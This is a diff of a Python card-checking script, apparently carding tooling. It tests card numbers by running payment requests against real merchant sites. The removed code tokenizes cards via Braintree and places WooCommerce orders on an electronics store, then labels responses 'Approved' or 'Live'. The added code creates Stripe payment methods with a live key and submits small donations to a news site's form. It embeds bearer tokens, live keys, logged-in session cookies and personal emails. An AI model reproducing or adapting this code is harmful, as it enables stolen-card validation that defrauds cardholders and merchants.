@@ -18,119 +18,71 @@ def Tele(ccx):
 	r = requests.session()
 
 	headers = {
-    'authority': 'payments.braintree-api.com',
-    'accept': '*/*',
-    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjgyOTQ3OTIsImp0aSI6IjU5MDgzNGQ2LTRiYzItNGM5MS04NzE0LThiMzVjZDUxNjQxYiIsInN1YiI6Ijh2cXZzbWsyaGJtNDdjNHQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijh2cXZzbWsyaGJtNDdjNHQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.uk5UJeYL8-rmyNRkqmHSwz6nTVAJt42Ed-vldJCp1DiD_LZxcK_RunRhLwIR35CYtG1r3S2B5s_rgPKqQIR4iw',
-    'braintree-version': '2018-05-10',
-    'content-type': 'application/json',
-    'origin': 'https://assets.braintreegateway.com',
-    'referer': 'https://assets.braintreegateway.com/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'cross-site',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-}
+			'authority': 'api.stripe.com',
+			'accept': 'application/json',
+			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
+			'content-type': 'application/x-www-form-urlencoded',
+			'origin': 'https://js.stripe.com',
+			'referer': 'https://js.stripe.com/',
+			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+			'sec-ch-ua-mobile': '?1',
+			'sec-ch-ua-platform': '"Android"',
+			'sec-fetch-dest': 'empty',
+			'sec-fetch-mode': 'cors',
+			'sec-fetch-site': 'same-site',
+			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+	}
 
-	json_data = {
-    'clientSdkMetadata': {
-        'source': 'client',
-        'integration': 'custom',
-        'sessionId': '92a3f9ce-17fa-4d9a-95d3-1134d7f0f18e',
-    },
-    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
-    'variables': {
-        'input': {
-            'creditCard': {
-                'number': n,
-                'expirationMonth': mm,
-                'expirationYear': yy,
-                'cvv': cvc,
-            },
-            'options': {
-                'validate': False,
-            },
-        },
-    },
-    'operationName': 'TokenizeCreditCard',
-}
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51DMipVKeLHvIBrT6uZAz9LxYzOMOThN05PGot0yoYRIOZNp15FLoaEoWAMJpapXjk4KRouXSLi0rQFEVB6uT6UqC00j5WzCylK'
+	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 
-	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-	tok=(response.json()['data']['tokenizeCreditCard']['token'])
-
+	pm = r1.json()['id']
 
 	cookies = {
-    'electron_wishlist_key': 'VFH6QR',
-    'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-10-06%2015%3A09%3A09%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.vrtechbay.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_first_add': 'fd%3D2024-10-06%2015%3A09%3A09%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.vrtechbay.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    'tu-geoip-ajax': '%7B%22city%22%3Anull%2C%22state%22%3Anull%2C%22country%22%3A%22Myanmar%22%7D',
-    'tu-geoip-hide': 'false',
-    'electron_cpv_17988': '10',
-    'woocommerce_items_in_cart': '1',
-    'woocommerce_cart_hash': '092384ca558c38c4b44d35b509b6f58e',
-    'popup_form_dismissed_1': '1',
-    'mailpoet_subscriber': '%7B%22subscriber_id%22%3A86%7D',
-    'wordpress_logged_in_c63d55e561767d2c9b9b3fd75a120daa': 'ghh.hh%7C1729438996%7CoyRKzPe4p2h9umHyLfSzBp4S956MJ0L5QI3QIjEfcsy%7C25dd8b75c496bb947f22cb7b5fb42fbee03df7bc54e9c9b02078256f2652c42b',
-    'wp_woocommerce_session_c63d55e561767d2c9b9b3fd75a120daa': '75%7C%7C1728401987%7C%7C1728398387%7C%7Cbe1e15e7b9b9d5550ab541cdcd70ec17',
-    'wfwaf-authcookie-7b3888a38b61caa6a4ba71aa803e0605': '75%7Cother%7Cread%7C5c1adcaab48e3fa8e1edbc9f414e1c03b077921190b74b83516fee18b31046df',
-    'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.vrtechbay.com%2Fcheckout%2F',
-    'mailpoet_page_view': '%7B%22timestamp%22%3A1728229562%7D',
-}
+			'__stripe_mid': 'e5b01e8c-dacf-4f97-b04e-4aca065681857ee92e',
+			'__stripe_sid': 'a94de27d-e021-4b13-8690-30e4fa15c00c581cca',
+	}
 
 	headers = {
-    'authority': 'www.vrtechbay.com',
-    'accept': 'application/json, text/javascript, */*; q=0.01',
-    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://www.vrtechbay.com',
-    'referer': 'https://www.vrtechbay.com/checkout/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-    'x-requested-with': 'XMLHttpRequest',
-}
+			'authority': 'tasmanianinquirer.com.au',
+			'accept': '*/*',
+			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
+			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+			# 'cookie': '__stripe_mid=cd04496a-fc78-49f6-99fc-6310e3e55e6221dc47; __stripe_sid=b3b7888f-21a6-4ff7-a3cf-b0242d6fcf37cce97e',
+			'origin': 'https://tasmanianinquirer.com.au',
+			'referer': 'https://tasmanianinquirer.com.au/contribute/',
+			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+			'sec-ch-ua-mobile': '?1',
+			'sec-ch-ua-platform': '"Android"',
+			'sec-fetch-dest': 'empty',
+			'sec-fetch-mode': 'cors',
+			'sec-fetch-site': 'same-origin',
+			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+			'x-requested-with': 'XMLHttpRequest',
+	}
 
 	params = {
-    'wc-ajax': 'checkout',
-}
+			't': '1728134582304',
+	}
 
-	data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fwww.vrtechbay.com%2Fcart%2F&wc_order_attribution_session_start_time=2024-10-06+15%3A09%3A09&wc_order_attribution_session_pages=5&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36&billing_first_name=Nge&billing_last_name=Chit&billing_company=Hh&billing_country=US&billing_address_1=New+York+&billing_address_2=Saturday+morning+&billing_city=New+York+&billing_state=NY&billing_postcode=10080&billing_phone=09400691006&billing_email=saimyataungcr8%40gmail.com&shipping_first_name=Ghh&shipping_last_name=Hh&shipping_company=Hh&shipping_country=US&shipping_address_1=Jigg&shipping_address_2=Hgg&shipping_city=Vhh&shipping_state=NY&shipping_postcode=10080&order_comments=&shipping_method%5B0%5D=wf_multi_carrier_shipping%3Aups_UPS+Ground&payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=0&wc-braintree-credit-card-3d-secure-order-total=86.36&wc_braintree_credit_card_payment_nonce={tok}&mailpoet_woocommerce_checkout_optin=1&mailpoet_woocommerce_checkout_optin_present=1&cr_customer_consent=on&cr_customer_consent_field=1&terms=on&terms-field=1&woocommerce-process-checkout-nonce=ceea787b9f&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
-
-	response = requests.post('https://www.vrtechbay.com/', params=params, cookies=cookies, headers=headers, data=data)
-
-	text = response.text
-	pattern = r'Reason: (.+?)\s*</li>'
-	match = re.search(pattern, text)
-	if match:
-		result = match.group(1)
-	else:
-		if "Insufficient funds in account, please use an alternate card or other form of payment." in text:
-			return('Approved ✅')
-		elif "CVV." in text:
-			return(' cvv ❌')
-		elif "The provided card was declined, please use an alternate card or other form of payment." in text:
-			return('Card Not Activated')
-		elif "The provided card is expired, please use an alternate card or other form of payment." in text:
-			return('The Card is Expired')
-		elif "The card type is invalid or does not correlate with the credit card number. Please try again or use an alternate card or other form of payment." in text:
-			return('Approved ✅! CVV')
-		elif "The card verification number does not match. Please re-enter and try again." in text:
-			return('Approved ✅! Live')
-		elif "We cannot process your order with the payment information that you provided. Please use a different payment account or an alternate payment method." in text:
-			return('Declined - Call Issuer')
-		else:
-			return(' Cvv  ❌')
+	data = {
+			'data': '__fluent_form_embded_post_id=3500&_fluentform_3_fluentformnonce=f254f6607b&_wp_http_referer=%2Fcontribute%2F&payment_input_1=5&email=rein48287%40gmail.com&names_1%5Bfirst_name%5D=Rein&names_1%5Blast_name%5D=Rein&payment_method=stripe&checkbox%5B%5D=Check%20to%20receive%20a%20free%20email%20alert%20when%20we%20publish%20a%20new%20story&__entry_intermediate_hash=372032a6a1cf4f2f7168c0435348c0a3&__stripe_payment_method_id='+str(pm)+'',
+			'action': 'fluentform_submit',
+			'form_id': '3',
+	}
+	
+	response = requests.post(
+			'https://tasmanianinquirer.com.au/wp-admin/admin-ajax.php',
+			params=params,
+			cookies=cookies,
+			headers=headers,
+			data=data,
+	).json()
+	try:
+		ii=response['errors']
+	except:
+		return 'success'
+	return ii
 			
 def Tele2(ccx):
 	import requests
